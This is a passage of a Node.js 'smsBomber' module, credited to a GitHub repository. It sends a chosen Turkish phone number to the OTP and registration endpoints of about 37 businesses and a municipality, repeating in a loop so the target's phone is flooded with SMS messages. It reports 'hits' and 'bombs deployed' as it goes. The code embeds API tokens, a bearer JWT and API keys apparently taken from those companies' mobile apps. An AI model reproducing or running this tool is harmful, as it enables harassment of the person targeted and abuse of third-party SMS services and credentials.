                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function ipragaz(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp',
                    headers: {
                        "Content-Type": "application/json", 
                        "X-Api-Token": "", 
                        "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", 
                        "Accept": "*/*", 
                        "App-Name": "ipragaz-mobile", 
                        "Os": "ios", 
                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", 
                        "App-Build": "41", "Os-Version": "15.7.7", 
                        "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", 
                        "Connection": "close"
                    },
                    json: {
                        "birthDate": "2/7/2000", 
                        "carPlate": "31 ABC 31", 
                        "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", 
                        "name": "Memati Bas", 
                        "otp": "", 
                        "phoneNumber": no,
                        "playerId": ""
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Ipragaz] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Ipragaz] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function metro(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json; charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Applicationversion": "2.1.1", 
                        "Applicationplatform": "2", 
                        "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", 
                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
                        "Connection": "close"
                    },
                    json: {
                        "methodType": "2",
                        "mobilePhoneNumber": `+90${no}`
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Metro] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Metro] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }
            
            function happy(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone',
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
                        "Accept": "application/json, text/javascript, */*; q=0.01", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "en-US,en;q=0.9", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Origin": "https://www.happy.com.tr", 
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
                        "Referer": "https://www.happy.com.tr/index.php?route=account/register"
                    },
                    json: {
                        "telephone": no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Happy] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Happy] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function komagene(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder',
                    headers: {
                        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
                    },
                    json: {
                        "Telefon": no,
                        "FirmaId": "32"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Komagene] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Komagene] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function kuryemgelsin(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/',
                    json: {
                        "phoneNumber": no,
                        "phone_country_code": "+90"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [KuryemGelsin] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [KuryemGelsin] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function taksim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://service.taksim.digital/services/PassengerRegister/Register',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json; charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="
                    },
                    json: {
                        "countryPhoneCode": '+90',
                        "name": "Memati",
                        "phoneNo": no,
                        "surname": "Bas",
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Taksim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Taksim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function toptanteslim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://toptanteslim.com:443/Services/V2/MobilServis.aspx',
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded", 
                        "Accept": "application/json", 
                        "Mode": "no-cors", 
                        "U": "e-ticaret",
                        "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Accept-Encoding": "gzip, deflate, br"
                    },
                    json: {
                        "ADRES": "ZXNlZGtm", 
                        "DIL": "tr_TR", 
                        "EPOSTA": `${faker.internet.email()}`,
                        "EPOSTA_BILDIRIM": true, 
                        "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", 
                        "ISLEM": "KayitOl", 
                        "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", 
                        "KIMLIKNO": null, 
                        "KULLANICI_ADI": "Memati", 
                        "KULLANICI_SOYADI": "Bas", 
                        "PARA_BIRIMI": "TL", 
                        "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", 
                        "POSTAKODU": "377777", 
                        "SEHIR": "\xc4\xb0STANBUL", 
                        "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", 
                        "SMS_BILDIRIM": true, 
                        "TELEFON": no,
                        "TICARI_UNVAN": "kdkd", 
                        "ULKE_ID": 1105, 
                        "VERGI_DAIRESI": "sjje", 
                        "VERGI_NU": ""
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [ToptanTeslim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [ToptanTeslim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function starbucks(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://auth.sbuxtr.com:443/signUp',
                    headers: {
                        "Content-Type": "application/json", 
                        "Operationchannel": "ios", 
                        "Accept": "*/*", 
                        "Accept-Encoding": "gzip, deflate, br"
                    },
                    json: {
                        "allowEmail": true, 
                        "allowSms": true, 
                        "deviceId": "31", 
                        "email": `${faker.internet.email()}`,
                        "firstName": "Memati", 
                        "lastName": "Bas", 
                        "password": "31ABC..abc31", 
                        "phoneNumber": no,
                        "preferredName": "Memati"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Starbucks] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Starbucks] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            } 

            function baydöner(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
                    headers: {
                        "Content-Type": "application/json", 
                        "Accept": "*/*", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Platform": "1", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"
                    },
                    json: {
                        "AppVersion": "1.3.2", 
                        "AreaCode": 90, 
                        "City": "ADANA", 
                        "CityId": 1, 
                        "Code": "", 
                        "Culture": "tr-TR", 
                        "DeviceId": "31s", 
                        "DeviceModel": "31", 
                        "DeviceToken": "3w1", 
                        "Email": `${faker.internet.email()}`,
                        "GDPRPolicy": false, 
                        "Gender": "Erkek", 
                        "GenderId": 1, 
                        "LoyaltyProgram": false, 
                        "merchantID": 5701, 
                        "Method": "",
                        "Name": "Memati", 
                        "notificationCode": "31", 
                        "NotificationToken": "31", 
                        "OsSystem": "IOS", 
                        "Password": "31Memati31", 
                        "PhoneNumber": no,
                        "Platform": 1, 
                        "sessionID": "31", 
                        "socialId": "", 
                        "SocialMethod": "", 
                        "Surname": "Bas", 
                        "TempId": 942603, 
                        "TermsAndConditions": false
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [BayDöner] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [BayDöner] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

                function pidem(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://restashop.azurewebsites.net:443/graphql/',
                        headers: {
                            "Accept": "*/*", 
                            "Origin": "https://pidem.azurewebsites.net", 
                            "Content-Type": "application/json", 
                            "Authorization": "Bearer null", 
                            "Referer": "https://pidem.azurewebsites.net/", 
                            "Accept-Language": "tr-TR,tr;q=0.9", 
                            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
                            "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": no}
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Pidem] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Pidem] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

                function bodrumbelediyesi(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://gandalf.orwi.app:443/api/user/requestOtp',
                        headers: {
                            "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
                        },
                        json: {
                            "gsm": "+90"+no,
                            "source": "orwi"
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [BodrumBelediyesi] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [BodrumBelediyesi] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

            function frink(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.frink.com.tr:443/api/auth/postSendOTP',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json", 
                        "Authorization": "", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", 
                        "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
                        "Connection": "close"
                    },
                    json: {
                        "areaCode": "90", 
                        "etkContract": true, 
                        "language": "TR", 
                        "phoneNumber": "90"+no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Fring] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Fring] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function dominos(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode',
                    headers: {
                        "Content-Type": "application/json;charset=utf-8", 
                        "Accept": "application/json, text/plain, */*", 
                        "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", 
                        "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", 
                        "Appversion": "IOS-7.1.0", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Servicetype": "CarryOut", 
                        "Locationcode": "undefined"
                    },
                    json: {
                        "email": `${faker.internet.email()}`,
                        "isSure": false, 
                        "mobilePhone": no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Dominos] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Dominos] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

                function yapp(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://api.yapp.com.tr:443/api/v1/auth/phone',
                        json: {
                            "app_version": "1.1.2", 
                            "code": "tr", 
                            "device_model": "iPhone9,4", 
                            "device_name": "", 
                            "device_type": "I", 
                            "device_version": "15.7.8", 
                            "email": `${faker.internet.email()}`,
                            "firstname": "Memati", 
                            "is_allow_to_communication": "1", 
                            "language_id": "1", 
                            "lastname": "Bas", 
                            "phone_number": no,
                            "sms_code": ""
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Yapp] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Yapp] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

                function porty(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://api.porty.com.tr:443/api/v1/auth/phone',
                        headers: {
                            "Accept": "*/*", 
                            "Content-Type": "application/json; charset=UTF-8", 
                            "Accept-Encoding": "gzip, deflate", 
                            "Accept-Language": "en-US,en;q=0.9", 
                            "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                            "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
                        },
                        json: {
                            "job": "start_login", 
                            "phone": no,
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Porty] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Porty] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

                function clickme(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code',
                        headers: {
                            "Content-Type": "application/json", 
                            "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", 
                            "Client-Version": "1.4.0", 
                            "Client-Device": "IOS", 
                            "Accept-Language": "tr-TR,tr;q=0.9", 
                            "Accept-Encoding": "gzip, deflate, br", 
                            "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Clickme] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Clickme] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

                function akbati(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://akbati-admin.poilabs.com:443/v1/tr/sms',
                        headers: {
                            "Accept": "*/*", 
                            "Content-Type": "application/json", 
                            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", 
                            "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
                            "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Akbati] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Akbati] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

                function akasya(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://akasya-admin.poilabs.com:443/v1/tr/sms',
                        headers: {
                            "Accept": "*/*", "Content-Type": "application/json", 
                            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", 
                            "User-Agent": "Akasya", 
                            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.green("🚀 [HIT]") +
                                chalk.cyan(" [Akbati] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.green("✅ DEPLOYED"));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                                chalk.red("💥 [MISS]") +
                                chalk.cyan(" [Akbati] ") +
                                chalk.white(`Target: +90${no} `) +
                                chalk.red("❌ FAILED"));
                        }
                    });
                }

            async function send(no) {
                kigili(no); // 1
                kahvedunyasi(no); // 2 
                wmf(no); // 3 |
                tiklagelsin(no); // 4 |
                bim(no); // 5
                sok(no); // 6
                migros(no); // 7
                a101(no); // 8
                sakasu(no); // 9
                zarinplus(no); // 10
                coregap(no); // 11
                icq(no); // 12
                naosstars(no); // 13
                rentiva(no); // 14
                loncamarket(no); // 15
                kimgb(no); // 16
                tazi(no); // 17
                evidea(no); // 18
                heyscooter(no); // 19
                koton(no); // 20
                ipragaz(no); // 21
                metro(no); // 22
                happy(no); // 23
                komagene(no); // 24
                kuryemgelsin(no); // 25
                taksim(no); // 26
                toptanteslim(no); // 27
                starbucks(no); // 28
                baydöner(no); // 29
                pidem(no); // 30
                bodrumbelediyesi(no); // 31
                frink(no); // 32
                dominos(no); // 33
                yapp(no); // 34
                clickme(no); // 35
                akbati(no); // 36
                akasya(no); // 37
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

            async function systemFinished() {
                if (systemFinishedT == true) return;
                
                console.log('\n' + chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                console.log(chalk.green.bold('🏆 MISSION COMPLETED SUCCESSFULLY 🏆'));
                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                console.log(chalk.cyan(`📊 Total Deployed: ${dataSb.total} bombs`));
                console.log(chalk.green(`✅ Successful: ${dataSb.success} hits`));
                console.log(chalk.red(`❌ Failed: ${dataSb.error} misses`));
                console.log(chalk.yellow(`🎯 Success Rate: ${((dataSb.success/dataSb.total)*100).toFixed(2)}%`));
                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));
                
                const result = { status: true, dataSb };
                systemFinishedT = true;
                return resolve(result);
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

        } catch (e) {
            console.error(chalk.red("💀 [CRITICAL ERROR] System failure:"), e);
            const result = { status: false, message: "Critical system error occurred." };
            reject(result);
        }
    });

    const result = await queryPromise;
    return result;
}

module.exports = smsBomber;


/*

https://github.com/egehan0250/Sms_Bomber_Api/blob/main/functions/sms.js adresinden alınmıştır.

*/